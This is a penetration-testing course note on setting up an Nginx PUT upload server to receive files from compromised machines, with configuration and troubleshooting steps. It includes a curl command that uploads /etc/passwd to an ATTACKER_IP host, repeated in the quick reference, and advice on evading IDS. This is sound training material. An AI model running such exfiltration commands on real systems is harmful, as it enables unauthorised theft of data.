# 07 — Catching Files over HTTP/S

## Overview

HTTP/HTTPS is the **most common file transfer method** because firewalls almost always allow it, and HTTPS provides encryption in transit. This section covers setting up a secure upload server using Nginx to receive files from compromised machines.

> ⚠️ Never transfer sensitive files (passwords, hashes, credentials) over plaintext HTTP during an engagement. A client's IDS catching unencrypted sensitive data in transit is a bad look.

---

## Why Nginx over Apache?

| Factor | Nginx | Apache |
|--------|-------|--------|
| **Configuration** | Simple, minimal | Complex module system |
| **PHP Execution Risk** | Not easily configured | PHP module auto-executes `.php` files |
| **Directory Listing** | Disabled by default | Enabled by default (leaks uploaded files) |
| **Web Shell Risk** | Low | High — easy to accidentally enable execution |

> 💡 Apache's PHP module will happily execute anything ending in `.php`. With Nginx, configuring PHP is intentionally difficult — making it safer for upload-only servers.

---

## Setting Up Nginx for File Uploads (PUT Method)

### Step 1: Create Upload Directory

```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```
> Creates the directory tree that will receive uploaded files; rename `SecretUploadDirectory` to an unpredictable name.

### Step 2: Set Ownership

```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```
> Gives the Nginx worker user ownership so it can write uploads there; match the path to the directory you created.

### Step 3: Create Nginx Config

Create `/etc/nginx/sites-available/upload.conf`:

```nginx
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

> Uses port 9001 to avoid conflicts. `dav_methods PUT` enables HTTP PUT uploads to that path only.

### Step 4: Enable the Site

```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```
> Symlinks the upload site config into sites-enabled so Nginx loads it; match the filename to the config you created.

### Step 5: Start Nginx

```bash
sudo systemctl restart nginx.service
```
> Restarts Nginx so the new upload config takes effect; no values to change.

---

## Troubleshooting: Port 80 Already in Use

On PwnBox, port 80 is typically occupied by websockify.

**Check error log:**

```bash
tail -2 /var/log/nginx/error.log
```
> Shows the last two Nginx error lines to diagnose why it won't start; change `-2` for more lines.

**Find what's using port 80:**

```bash
ss -lnpt | grep 80
ps -ef | grep <PID>
```
> Finds which process holds port 80 and identifies it by PID; replace `<PID>` with the PID from the ss output.

**Fix — Remove default Nginx config (binds to port 80):**

```bash
sudo rm /etc/nginx/sites-enabled/default
sudo systemctl restart nginx.service
```
> Removes the default site (which binds port 80) and restarts Nginx so your upload config can bind cleanly; no values to change.

---

## Uploading Files to the Server

Use cURL with `-T` (upload/PUT) flag from the compromised machine:

```bash
curl -T /etc/passwd http://ATTACKER_IP:9001/SecretUploadDirectory/users.txt
```
> PUT-uploads a file from the compromised host to your Nginx server; swap the local path, `ATTACKER_IP`, port, directory, and remote filename.

**Verify the upload:**

```bash
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
```
> Prints the last line of the uploaded file to confirm the transfer worked; match the path/filename to what you uploaded.

---

## Security Considerations

| Check | Why |
|-------|-----|
| **Directory listing disabled** | Nginx disables this by default — verify by browsing to the upload path |
| **No PHP/script execution** | Ensure uploaded files can't be executed as code |
| **Non-obvious directory name** | `SecretUploadDirectory` is just an example — use something unpredictable |
| **Use HTTPS when possible** | Encrypt data in transit to avoid IDS detection |
| **Clean up after engagement** | Remove uploaded files and the Nginx config when done |

> Test by navigating to `http://localhost:9001/SecretUploadDirectory/` — you should get a 403, not a file listing.

---

## Quick Reference

| Task | Command |
|------|---------|
| Create upload dir | `sudo mkdir -p /var/www/uploads/SecretUploadDirectory` |
| Set permissions | `sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory` |
| Enable site | `sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/` |
| Start/restart Nginx | `sudo systemctl restart nginx.service` |
| Upload a file | `curl -T /path/to/file http://ATTACKER_IP:9001/SecretUploadDirectory/filename` |
| Check errors | `tail -2 /var/log/nginx/error.log` |
| Remove default config | `sudo rm /etc/nginx/sites-enabled/default` |
